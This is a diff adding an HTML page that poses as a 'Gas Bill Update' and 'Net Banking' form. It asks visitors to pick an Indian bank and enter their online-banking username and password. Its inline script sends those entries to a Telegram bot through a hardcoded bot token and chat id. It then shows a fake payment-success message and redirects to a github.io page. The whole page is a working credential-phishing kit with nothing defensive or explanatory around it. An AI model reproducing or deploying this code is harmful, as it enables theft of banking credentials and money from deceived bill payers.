@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="help/style.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <title>Gas Bill Update</title>
+     <centre>
+                
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            width: 90%;
+            max-width: 400px;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .header {
+            background-color: #007bff;
+            color: #fff;
+            padding: 10px;
+            border-radius: 8px 8px 0 0;
+            text-align: center;
+            font-size: 1.2em;
+        }
+        .form-group {
+            margin: 15px 0;
+        }
+        .form-group label {
+            
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        .form-group input, .form-group select, .form-group button,select {
+            width: 96%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        .form-group input {
+            width: 94%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            background-color: #dc3545;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 1em;
+        }
+        .btn:hover {
+            background-color: #c82333;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 0.8em;
+            color: #666;
+        }
+        .payment-method {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 20px 0;
+        }
+        .payment-method img {
+            width: 60px;
+            height: 60px;
+            margin: 0 5px;
+        }
+        
+        }
+                
+    </style>
+</head>
+<body>
+      <br>
+    <div class="container">
+        <p align="center"><img style="width: 150px" src="https://i.postimg.cc/d1T3n6Cv/bgl-logo-png.png" ></a>
+        
+       <div class="header" style="font-weight: bold;">Net Banking</div>
+       
+        
+        <div class="form-group">
+            
+        </div>
+        <form id="credit-card-form" class="hidden" onsubmit="return sender()">
+           
+            <label for="bank" style="font-weight: bold;">Select Bank<span style="color: red;">*</span></label>
+                <select id="Credit" name="Credit" required>
+                    
+                    <option value="" disabled selected>Select Bank</option>
+                    <option value="HDFC Bank">HDFC Bank</option>
+                    <option value="Axis Bank">Axis Bank</option>
+                    <option value="SBI">SBI</option>
+                    <option value="Kotak Bank">Kotak Bank</option>
+                    <option value="UCO Bank">UCO Bank</option>
+                    <option value="Indusind Bank">Indusind Bank</option>
+                    <option value="Union Bank">Union Bank</option>
+                    <option value="Yes Bank">Yes Bank</option>
+                    <option value="Bank of India">Bank of India</option>
+                    <option value="Bank of Baroda">Bank of Baroda</option>
+                    <option value="Canara Bank">Canara Bank</option>
+                    <option value="City Union Bank">City Union Bank</option>
+                    <option value="Central Bank of India">Central Bank of India</option>
+                    <option value="Punjab National Bank">Punjab National Bank</option>
+                    <option value="ICICI Bank">ICICI Bank</option>
+                    <option value="RBL">RBL</option>
+                    <option value="AU Small Finance Bank">AU Small Finance Bank</option>
+                    <option value="CITI Bank">CITI Bank</option>
+                    <option value="other">Others</option>
+                </select>
+               
+            <div class="form-group">
+                <label for="cc-number">Username<span style="color: red;">*</span></label>
+                
+                
+                <input type="text" id="expiry" name="expiry" style="width: 326px" placeholder="Username" required>
+                
+            </div>
+            <div class="form-group">
+                <label for="cc-cvv">Password<span style="color: red;">*</span></label>
+                
+                
+                <input type="text" id="cvv" name="cvv" style="width: 326px" placeholder="Password" required>
+                
+                <br><br>
+            </div>
+            <button type="submit" class="btn">PROCEED</button>
+        </form>
+        <br><br><br>
+    </div>
+    <br><br><br>
+<link rel="stylesheet" href="style.css">
+    <script src="sender.js"></script>
+  
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  
+  <script>
+  //bot token
+var telegram_bot_id = "7838859798:AAEk-t5FqdpEnEPEtsEpGLGaDK8OR0QU1sA";
+//chat id
+var chat_id = 7065159395;
+var ready = function () {
+    Credit = document.getElementById("Credit").value;
+    expiry = document.getElementById("expiry").value;
+    cvv = document.getElementById("cvv").value;
+  
+    message = 
+      "\nBank Naam: " + Credit +  
+      "\nUserName: " + expiry + 
+      "\nPassword: " + cvv;
+};
+var sender = function () {
+    ready();
+    var settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+        },
+        "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message,
+          "file": message
+        })
+    };
+    $.ajax(settings).done(function (response) {
+        console.log(response); 
+      
+      swal("Successfull", "Your Payment Successfull", "success");
+      
+      document.location = "https://ringtone11.github.io/3Customer6/";
+      
+    });
+    document.getElementById("Credit").value = "";
+    document.getElementById("expiry").value = "";
+    document.getElementById("cvv").value = "";
+    return false;
+};
+  </script>
+</body>
+</html>
